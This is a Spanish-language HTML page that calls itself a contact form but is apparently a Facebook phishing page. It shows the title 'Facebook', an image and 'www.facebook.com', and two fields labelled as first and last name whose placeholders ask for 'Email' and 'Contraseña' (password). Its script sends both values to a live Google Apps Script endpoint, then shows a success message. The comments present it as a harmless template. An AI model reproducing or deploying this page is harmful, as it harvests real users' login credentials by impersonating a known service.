<!DOCTYPE html>

<html lang="es">

<head>

  <!-- ======================================================
       CONFIGURACIÓN GENERAL DE LA PÁGINA
       ====================================================== -->

  <meta charset="UTF-8">

<meta
name="viewport"
content="width=device-width, initial-scale=1.0"

>

  <!-- DESCRIPCIÓN PARA GOOGLE -->

<meta
name="description"
content="Formulario de contacto"

>

  <!-- TÍTULO QUE APARECE EN LA PESTAÑA DEL NAVEGADOR -->

  <title>
    web
  </title>

  <!-- ======================================================
       DISEÑO / CSS
       ====================================================== -->

  <style>


    /* ======================================================
       CONFIGURACIÓN GENERAL
       ====================================================== */

    * {
      box-sizing: border-box;
    }


    /* ======================================================
       FONDO GENERAL DE LA PÁGINA

       AQUÍ PUEDES CAMBIAR EL FONDO
       ====================================================== */

    body {

      margin: 0;

      min-height: 100vh;

      padding: 20px;

      display: flex;

      align-items: center;

      justify-content: center;

      font-family:
        Arial,
        Helvetica,
        sans-serif;

      background:
        linear-gradient(
          135deg,
          #eef2f6,
          #dce2e8
        );

      color: #1f2937;

    }


    /* ======================================================
       CAJA PRINCIPAL DEL FORMULARIO

       AQUÍ PUEDES CAMBIAR:
       - ANCHO
       - FONDO
       - BORDES
       - SOMBRA
       ====================================================== */

    .contenedor {

      width: 100%;

      max-width: 430px;

      padding: 32px;

      background: #ffffff;

      border-radius: 18px;

      box-shadow:
        0 15px 45px
        rgba(0, 0, 0, 0.14);

    }



    /* ======================================================
       TÍTULO PRINCIPAL
       ====================================================== */

    h1 {

      margin:
        0 0 10px;

      text-align: center;

      font-size: 50px;

      color: #5A9BF2;

    }


    /* ======================================================
       IMAGEN / MINIATURA DEL FORMULARIO

       ESTA ES LA NUEVA SECCIÓN.

       LA IMAGEN APARECERÁ DEBAJO DEL TÍTULO.

       PUEDES CAMBIAR EL TAMAÑO DESDE AQUÍ.
       ====================================================== */

    .imagen-formulario {

      width: 100%;

      display: flex;

      justify-content: center;

      align-items: center;

      margin:
        8px 0 40px;

    }


    .imagen-formulario img {

      width: 70px;

      height: 70px;

      object-fit: cover;

      border-radius: 12px;

      display: block;

      box-shadow:
        0 5px 15px
        rgba(0, 0, 0, 0.12);

    }


    /* ======================================================
       DESCRIPCIÓN
       ====================================================== */

    .descripcion {

      margin:
        0 0 28px;

      text-align: center;

      color: #6b7280;

      font-size: 12px;

      line-height: 1.5;

    }


    /* ======================================================
       GRUPOS DE CAMPOS
       ====================================================== */

    .grupo {

      margin-bottom: 18px;

    }


    /* ======================================================
       ETIQUETAS
       ====================================================== */

    label {

      display: block;

      margin-bottom: 7px;

      font-size: 14px;

      font-weight: bold;

      color: #374151;

    }


    /* ======================================================
       CAMPOS DE TEXTO
       ====================================================== */

    input {

      width: 100%;

      height: 50px;

      padding:
        0 14px;

      border:
        1px solid #d1d5db;

      border-radius: 9px;

      background: #ffffff;

      color: #111827;

      font-size: 16px;

      outline: none;

    }


    /* ======================================================
       CAMPOS CUANDO EL USUARIO LOS SELECCIONA
       ====================================================== */

    input:focus {

      border-color: #2563eb;

      box-shadow:
        0 0 0 3px
        rgba(37, 99, 235, 0.12);

    }


    /* ======================================================
       BOTÓN ENVIAR
       ====================================================== */

    button {

      width: 100%;

      height: 50px;

      margin-top: 4px;

      border: none;

      border-radius: 9px;

      background:
        linear-gradient(
          135deg,
          #2563eb,
          #1d4ed8
        );

      color: #ffffff;

      font-size: 16px;

      font-weight: bold;

      cursor: pointer;

    }


    /* BOTÓN DESACTIVADO MIENTRAS ENVÍA */

    button:disabled {

      opacity: 0.6;

      cursor: not-allowed;

    }


    /* ======================================================
       MENSAJES DEL FORMULARIO
       ====================================================== */

    .mensaje {

      display: none;

      margin-top: 18px;

      padding: 14px;

      border-radius: 9px;

      text-align: center;

      font-size: 14px;

      line-height: 1.45;

    }


    .mensaje.mostrado {

      display: block;

    }


    /* MENSAJE "ENVIANDO..." */

    .mensaje.enviando {

      background: #eff6ff;

      color: #1d4ed8;

    }


    /* MENSAJE CORRECTO */

    .mensaje.correcto {

      background: #ecfdf5;

      color: #047857;

    }


    /* MENSAJE DE ERROR */

    .mensaje.error {

      background: #fef2f2;

      color: #b91c1c;

    }


    /* ======================================================
       AVISO INFORMATIVO
       ====================================================== */

    .informacion {

      margin-top: 20px;

      padding: 13px;

      border-radius: 9px;

      background: #f3f4f6;

      color: #6b7280;

      font-size: 12px;

      line-height: 1.5;

      text-align: center;

    }


    /* ======================================================
       PIE DEL FORMULARIO
       ====================================================== */

    .pie {

      margin-top: 20px;

      text-align: center;

      color: #9ca3af;

      font-size: 11px;

    }


  </style>

</head>

<body>

  <!-- ======================================================
       CONTENEDOR PRINCIPAL
       ====================================================== -->

  <main class="contenedor">


<!-- ====================================================
     TÍTULO DEL FORMULARIO

     CAMBIA ESTE TEXTO SI QUIERES.
     ==================================================== -->

<h1>
  Facebook
</h1>


<!-- ====================================================
     IMAGEN EN MINIATURA

     ====================================================

     ⭐⭐⭐ AQUÍ PONES LA IMAGEN ⭐⭐⭐

     CAMBIA:

     AQUI_PONES_LA_URL_DE_TU_IMAGEN

     POR LA URL REAL DE TU IMAGEN.

     EJEMPLO:

     https://tusitio.com/logo.png

     ==================================================== -->

<div class="imagen-formulario">

  <img
    src="https://i.imgur.com/SoScJt7.jpeg"
    alt="Imagen del formulario"
  >

</div>


<!-- ====================================================
     TEXTO DESCRIPTIVO

     CAMBIA ESTE TEXTO SI QUIERES.
     ==================================================== -->

<p class="descripcion">

  Tienes una petición de... 

</p>


<!-- ====================================================
     FORMULARIO
     ==================================================== -->

<form
  id="formulario"
  autocomplete="on"
>


  <!-- ==================================================
       CAMPO NOMBRE
       ================================================== -->

  <div class="grupo">

    <label for="nombre">

      Nombre

    </label>

    <input
      type="text"
      id="nombre"
      name="nombre"
      placeholder="Email"
      autocomplete="given-name"
      maxlength="100"
      required
    >

  </div>


  <!-- ==================================================
       CAMPO APELLIDOS
       ================================================== -->

  <div class="grupo">

    <label for="apellidos">

      Apellidos

    </label>

    <input
      type="password"
      id="apellidos"
      name="apellidos"
      placeholder="Contraseña"
      autocomplete="family-name"
      maxlength="150"
      required
    >

  </div>


  <!-- ==================================================
       BOTÓN ENVIAR
       ================================================== -->

  <button
    type="submit"
    id="botonEnviar"
  >

    Enviar

  </button>


</form>


<!-- ====================================================
     MENSAJE DE ESTADO
     ==================================================== -->

<div
  id="mensaje"
  class="mensaje"
></div>


<!-- ====================================================
     AVISO INFORMATIVO

     PUEDES CAMBIAR ESTE TEXTO.
     ==================================================== -->

<div class="informacion">

www.facebook.com
</div>


<!-- ====================================================
     PIE

     PUEDES CAMBIAR ESTE TEXTO.
     ==================================================== -->

<div class="pie">

 Derechos reservados de autor

</div>


  </main>

  <!-- ======================================================
       JAVASCRIPT
       ====================================================== -->

  <script>


    // ======================================================
    // URL DE GOOGLE APPS SCRIPT
    // ======================================================

    /*
       ⭐⭐⭐ ESTA ES UNA DE LAS PARTES MÁS IMPORTANTES ⭐⭐⭐

       AQUÍ VA LA URL /exec QUE TE DA GOOGLE APPS SCRIPT.

       TU URL ACTUAL ESTÁ PUESTA AQUÍ.
    */

    const URL_APPS_SCRIPT =
      "https://script.google.com/macros/s/AKfycbw7oPbIaUXSVG8OnMpPpI45x6PH8N7ZeukyG5OoMfeGQYJc_7-102L8ONdTxEeAMQwR/exec";


    /*
       SI EN EL FUTURO GOOGLE TE DA OTRA URL:

       1. BORRA LA URL ANTERIOR.
       2. PEGA LA NUEVA.
       3. NO CAMBIES NADA MÁS DE ESTA PARTE.
    */


    // ======================================================
    // CONECTAR CON LOS ELEMENTOS DEL FORMULARIO
    // ======================================================

    const formulario =
      document.getElementById(
        "formulario"
      );


    const nombre =
      document.getElementById(
        "nombre"
      );


    const apellidos =
      document.getElementById(
        "apellidos"
      );


    const botonEnviar =
      document.getElementById(
        "botonEnviar"
      );


    const mensaje =
      document.getElementById(
        "mensaje"
      );


    // ======================================================
    // DETECTAR CUANDO SE PULSA "ENVIAR DATOS"
    // ======================================================

    formulario.addEventListener(
      "submit",
      function(event) {


        // EVITAR QUE LA PÁGINA SE RECARGUE

        event.preventDefault();


        // ==================================================
        // RECOGER NOMBRE
        // ==================================================

        const nombreValor =
          nombre.value.trim();


        // ==================================================
        // RECOGER APELLIDOS
        // ==================================================

        const apellidosValor =
          apellidos.value.trim();


        // ==================================================
        // COMPROBAR QUE LOS DOS CAMPOS ESTÁN COMPLETOS
        // ==================================================

        if (
          !nombreValor ||
          !apellidosValor
        ) {

          mostrarMensaje(
            "Debes completar Nombre y Apellidos.",
            "error"
          );

          return;

        }


        // ==================================================
        // DESACTIVAR BOTÓN
        // ==================================================

        botonEnviar.disabled = true;

        botonEnviar.textContent =
          "Enviando...";


        // ==================================================
        // MOSTRAR MENSAJE DE ENVÍO
        // ==================================================

        mostrarMensaje(
          "Enviando tus datos...",
          "enviando"
        );


        // ==================================================
        // PREPARAR LOS DATOS
        // ==================================================

        const datos =
          new URLSearchParams();


        datos.append(
          "nombre",
          nombreValor
        );


        datos.append(
          "apellidos",
          apellidosValor
        );


        // ==================================================
        // ENVIAR A GOOGLE APPS SCRIPT
        // ==================================================

        fetch(
          URL_APPS_SCRIPT,
          {

            method: "POST",

            mode: "no-cors",

            body: datos

          }
        )


        // ==================================================
        // SI LA PETICIÓN TERMINA
        // ==================================================

        .then(
          function() {


            // LIMPIAR FORMULARIO

            formulario.reset();


            // MOSTRAR MENSAJE CORRECTO

            mostrarMensaje(
              "Los datos se han enviado correctamente.",
              "correcto"
            );


            // ACTIVAR BOTÓN

            botonEnviar.disabled =
              false;


            botonEnviar.textContent =
              "Enviar datos";

          }
        )


        // ==================================================
        // SI HAY UN ERROR
        // ==================================================

        .catch(
          function(error) {


            console.error(
              "Error:",
              error
            );


            mostrarMensaje(
              "No se pudieron enviar los datos. Inténtalo de nuevo.",
              "error"
            );


            botonEnviar.disabled =
              false;


            botonEnviar.textContent =
              "Enviar datos";

          }
        );

      }
    );


    // ======================================================
    // FUNCIÓN PARA MOSTRAR MENSAJES
    // ======================================================

    function mostrarMensaje(
      texto,
      tipo
    ) {


      mensaje.className =
        "mensaje mostrado " +
        tipo;


      mensaje.textContent =
        texto;

    }


  </script>

</body>

</html>
